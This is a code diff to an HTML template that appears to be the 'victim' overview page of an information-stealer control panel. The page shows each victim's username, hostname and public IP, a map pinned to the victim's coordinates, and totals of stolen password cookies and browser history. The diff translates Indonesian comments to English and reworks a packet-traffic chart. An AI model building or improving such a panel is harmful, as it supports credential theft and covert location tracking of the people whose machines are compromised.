@@ -4,10 +4,10 @@
   <meta charset="UTF-8">
   <title>User Overview</title>
 
-  <!-- Link Font Awesome untuk ikon -->
+  <!-- Link Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
-  <!-- Link ke file CSS eksternal -->
+  <!-- Link to external CSS file -->
   <link rel="stylesheet" href="/static/overview.css">
 
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
@@ -16,31 +16,29 @@
 </head>
 <body>
 
-  <!-- Sidebar kiri berisi info user dan navigasi -->
+  <!-- Sidebar with user info and navigation -->
   <div class="sidebar">
     <div class="user-pic">
-        <img src="https://via.placeholder.com/80x80/8B4513/FFFFFF?text=Admin" alt="Admin Profile">
-    </div> <!-- Foto profil user -->
-    <h2>User 1</h2> <!-- Nama user -->
+        <img src="/static/image/admin-profil.jpg" alt="Admin Profile">
+    </div>
+    <h2>{{ victim.username }}</h2>
     
-    <!-- Menu navigasi -->
     <nav class="sidebar-nav">
       <a class="nav-item active" href="/overview?id={{ victim.id }}">Overview</a>
       <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
       <a class="nav-item" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
     </nav>
 
-    <!-- Tombol kembali -->
     <div class="back-btn">
         <a href="/victim" class="back-btn">
             <i class="fas fa-arrow-left back-icon"></i>Back</a>
     </div>
   </div>
 
-  <!-- Konten utama -->
+  <!-- Main content -->
   <div class="main-content">
 
-    <!-- Kotak data user -->
+    <!-- User data box -->
     <div class="box beige">
         <strong>Username:</strong> {{ victim.username }}<br>
         <strong>Hostname:</strong> {{ victim.hostname }}
@@ -61,28 +59,24 @@
         <strong>Public IP:</strong> {{ victim.public_ip or 'N/A' }}
     </div>
 
-    <!-- Grafik aktivitas jaringan -->
+    <!-- Network activity chart -->
     <div class="box network-chart">
       <strong>Network</strong><br><br>
 
-      <!-- Tambahkan elemen <canvas> di sini -->
-      <canvas id="networkChart"></canvas>
+      <canvas id="networkChart" width="400" height="200"></canvas>
 
-      <!-- Bagian baru untuk menampilkan jumlah paket -->
       <div class="packet-info">
           <p><strong>Packets Sent:</strong> <span id="packetsSentText">0</span></p>
           <p><strong>Packets Received:</strong> <span id="packetsReceivedText">0</span></p>
 
-          <!-- Note bahwa data dikalikan dengan faktor 1000 -->
           <p class="note-info"><strong>Note:</strong> Data ini adalah faktor dari 1000.</p>
       </div>
     </div>
 
-    <!-- Peta lokasi user menggunakan Google Maps -->
+    <!-- Location map -->
     <div class="box location">
       <strong>Location</strong><br><br>
       <div class="map-container">
-        <!-- Google Maps Iframe -->
         <iframe 
           src="https://www.google.com/maps?q={{ victim.latitude }},{{ victim.longitude }}&hl=en&z=12&output=embed" 
           width="100%" height="500" style="border:0;" allowfullscreen="" loading="lazy">
@@ -90,19 +84,19 @@
       </div>
     </div>
 
-    <!-- Informasi cookies -->
+    <!-- Password Cookies -->
     <div class="box pass-cookies">
       <strong>Password Cookies</strong><br><br>
-      <div class="url">total data:</div>
+      <div class="url">Total data: {{ total_passwords }}</div>
     </div>
 
-    <!-- Riwayat browser -->
+    <!-- Browser History -->
     <div class="box history-box">
       <strong>History Browser</strong><br><br>
-      <div class="browser">total data:</div>
+      <div class="browser">Total data: {{ total_history }}</div>
     </div>
 
-    <!-- Info tambahan bawah -->
+    <!-- Footer -->
     <div class="info-tip">
       <div>To obtain detailed information about Password Cookies and History Browser, select the sidebar now!</div>
           
@@ -114,83 +108,59 @@
   </div>
 
   <script>
-    const networkData = {{ network_data | default(None) | tojson | safe }};
-    console.log("Network Data:", networkData);
+    // Sample data - Replace with actual data
+    const labels = {{ labels | tojson }}; 
+    const packetsSent = {{ packets_sent | tojson }}; 
+    const packetsReceived = {{ packets_recv | tojson }}; 
 
-    const labels          = networkData ? [networkData.created_at] : ["Initial"];
-    const packetsSent     = networkData ? [networkData.packets_sent] : [0];
-    const packetsReceived = networkData ? [networkData.packets_recv] : [0];
-    
-    console.log("Network Data Received:", networkData);  // Debugging untuk melihat data yang diterima
+    // Display packets sent and received in text format
+    document.getElementById('packetsSentText').textContent = packetsSent.length > 0 ? packetsSent[0] + " packets sent" : "No data available";
+    document.getElementById('packetsReceivedText').textContent = packetsReceived.length > 0 ? packetsReceived[0] + " packets received" : "No data available";
 
-    // Set initial values as 0
-    var labels = [networkData ? networkData.created_at : "Initial"];  // Ensure there's always a label even if no data is available
-    var packetsSent = [0];  // Initial value set to 0
-    var packetsReceived = [0];  // Initial value set to 0
+    // Check if there is any data to display
+    if (packetsSent.length === 0 || packetsReceived.length === 0) {
+        // If there is no data, hide the chart and display a message
+        document.getElementById('networkChart').style.display = 'none';
+        document.querySelector('.packet-info').innerHTML = '<p><strong>No network data available.</strong></p>';
+    } else {
+        // Prepare data for bar chart
+        const data = {
+            labels: labels, // X-axis labels
+            datasets: [{
+                label: 'Packets Sent',
+                data: packetsSent, // Data for packets sent
+                backgroundColor: '#4A90E2', // Color of the bars
+                borderColor: '#4A90E2', // Border color of the bars
+                borderWidth: 1
+            }, {
+                label: 'Packets Received',
+                data: packetsReceived, // Data for packets received
+                backgroundColor: '#E94E77', // Color of the bars
+                borderColor: '#E94E77', // Border color of the bars
+                borderWidth: 1
+            }]
+        };
 
-    // If network data exists, update the values
-    if (networkData) {
-        labels = [networkData.created_at];
-        packetsSent = [networkData.packets_sent];
-        packetsReceived = [networkData.packets_recv];
+        const config = {
+            type: 'bar', // Change chart type to 'bar'
+            data: data,
+            options: {
+                scales: {
+                    x: {
+                        type: 'category',
+                        labels: labels // Use labels for x-axis
+                    },
+                    y: {
+                        beginAtZero: true // Set y-axis to begin at zero
+                    }
+                }
+            }
+        };
+
+        // Render the chart
+        const ctx = document.getElementById('networkChart').getContext('2d');
+        new Chart(ctx, config);
     }
-
-    // Debugging data untuk memastikan semuanya sudah sesuai
-    console.log("Labels:", labels);
-    console.log("Packets Sent:", packetsSent);
-    console.log("Packets Received:", packetsReceived);
-
-    // Update the packet info in text form
-    document.getElementById('packetsSentText').textContent = packetsSent[0] + " packets sent";
-    document.getElementById('packetsReceivedText').textContent = packetsReceived[0] + " packets received";
-
-    const ctx = document.getElementById('networkChart').getContext('2d');
-
-    const data = {
-        labels: labels,
-        datasets: [
-            {
-                label: 'Packet Sent',
-                data: packetsSent,
-                borderColor: '#4A90E2',
-                backgroundColor: '#4A90E2',
-                fill: false,
-                tension: 0.3,
-                pointRadius: 5  // Membuat titik lebih besar agar terlihat
-            },
-            {
-                label: 'Packet Received',
-                data: packetsReceived,
-                borderColor: '#8B4513',
-                backgroundColor: '#8B4513',
-                fill: false,
-                tension: 0.3,
-                pointRadius: 5  // Membuat titik lebih besar agar terlihat
-            }
-        ]
-    };
-
-    const config = {
-        type: 'line',  // Grafik jenis garis
-        data: data,
-        options: {
-            animation: {
-                duration: 1500,  // Durasi animasi grafik
-            },
-            scales: {
-                y: {
-                    beginAtZero: true  // Memulai sumbu Y dari 0
-                }
-            },
-            elements: {
-                point: {
-                    radius: 5  // Mengatur ukuran titik jika hanya ada satu titik data
-                }
-            }
-        }
-    };
-
-    new Chart(ctx, config);  // Menampilkan grafik
   </script>
 
 </body>
